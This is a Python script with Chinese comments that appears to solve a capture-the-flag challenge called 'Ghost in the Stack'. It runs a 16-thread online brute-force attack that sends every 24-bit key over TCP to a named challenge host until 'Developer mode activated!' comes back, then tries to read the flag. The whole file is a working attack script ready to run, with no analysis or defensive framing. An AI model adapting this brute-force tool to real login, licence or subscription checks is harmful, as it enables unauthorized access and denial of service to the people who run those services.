#!/usr/bin/env python3
import socket
import time
import threading
import sys

# 全局变量
found_key = None
stop_all = False
results_lock = threading.Lock()

def brute_force_range(thread_id, start_key, end_key, host, port):
    """单个线程暴力破解指定范围"""
    global found_key, stop_all
    
    print(f"[启动] 线程 {thread_id}: 范围 {start_key} - {end_key} (0x{start_key:06x} - 0x{end_key:06x})")
    
    try:
        # 建立连接
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        
        # 接收初始菜单
        s.recv(2048)
        
        tested_count = 0
        for key in range(start_key, end_key + 1):
            if stop_all or found_key is not None:
                break
                
            tested_count += 1
            
            # 每测试1000个打印进度
            if tested_count % 1000 == 0:
                progress = (tested_count / (end_key - start_key + 1)) * 100
                print(f"[进度] 线程 {thread_id}: {progress:.1f}% - 当前测试 {key} (0x{key:06x})")
            
            try:
                # 发送选项1
                s.send(b"1\n")
                time.sleep(0.01)
                
                # 接收subscription提示
                data = s.recv(1024).decode(errors='ignore')
                if "subscription" not in data.lower():
                    continue
                
                # 发送密钥
                s.send(f"{key}\n".encode())
                time.sleep(0.01)
                
                # 接收响应
                response = s.recv(2048).decode(errors='ignore')
                
                if "Developer mode activated!" in response:
                    with results_lock:
                        if found_key is None:  # 确保只有第一个找到的被记录
                            found_key = key
                            stop_all = True
                            
                            print(f"\n{'='*60}")
                            print(f"[SUCCESS] 线程 {thread_id} 找到密钥!")
                            print(f"[密钥] {key} (0x{key:06x})")
                            print(f"[响应] {response}")
                            print(f"{'='*60}")
                            
                            # 尝试获取flag内容
                            time.sleep(0.5)
                            try:
                                flag_data = s.recv(2048).decode(errors='ignore')
                                if flag_data.strip():
                                    print(f"[FLAG] {flag_data}")
                            except:
                                pass
                    break
                    
            except Exception as e:
                continue
        
        s.close()
        print(f"[完成] 线程 {thread_id}: 测试了 {tested_count} 个密钥")
        
    except Exception as e:
        print(f"[错误] 线程 {thread_id}: 连接失败 - {e}")

def main():
    global found_key, stop_all
    
    host = "ghost-in-the-stack.chall.edgesecurity.team"
    port = 1344
    
    print("=" * 80)
    print("Ghost in the Stack - 多线程暴力破解")
    print("=" * 80)
    
    # 配置参数
    max_value = 0xFFFFFF  # 24位最大值
    num_threads = 16      # 使用16个线程
    segment_size = max_value // num_threads
    
    print(f"[配置] 最大值: {max_value} (0x{max_value:06x})")
    print(f"[配置] 线程数: {num_threads}")
    print(f"[配置] 每线程范围: {segment_size} 个密钥")
    print(f"[配置] 目标: {host}:{port}")
    print("-" * 80)
    
    # 重置全局变量
    found_key = None
    stop_all = False
    
    threads = []
    
    # 创建并启动所有线程
    for i in range(num_threads):
        start = i * segment_size
        end = start + segment_size - 1
        
        # 最后一个线程处理剩余部分
        if i == num_threads - 1:
            end = max_value
        
        thread = threading.Thread(
            target=brute_force_range,
            args=(i + 1, start, end, host, port),
            daemon=True
        )
        threads.append(thread)
        thread.start()
        
        # 错开启动时间，避免同时连接
        time.sleep(0.2)
    
    print(f"[启动] 成功启动 {len(threads)} 个暴力破解线程")
    print("-" * 80)
    
    try:
        # 主线程等待结果
        while not stop_all and found_key is None:
            time.sleep(1)
            
            # 检查还有多少线程在运行
            alive_threads = [t for t in threads if t.is_alive()]
            if not alive_threads:
                print("[完成] 所有线程都已结束")
                break
        
        if found_key is not None:
            print(f"\n[最终结果] 成功破解!")
            print(f"[最终密钥] {found_key} (0x{found_key:06x})")
            
            # 停止所有线程
            stop_all = True
            
            # 等待线程结束
            for thread in threads:
                thread.join(timeout=2)
            
            return found_key
        else:
            print("\n[失败] 未找到正确的密钥")
            return None
            
    except KeyboardInterrupt:
        print("\n[中断] 收到 Ctrl+C，停止所有线程...")
        stop_all = True
        
        # 等待线程结束
        for thread in threads:
            thread.join(timeout=2)
        
        return None

if __name__ == "__main__":
    result = main()
    
    if result:
        print(f"\n程序结束 - 找到密钥: {result}")
        sys.exit(0)
    else:
        print("\n程序结束 - 未找到密钥")
        sys.exit(1)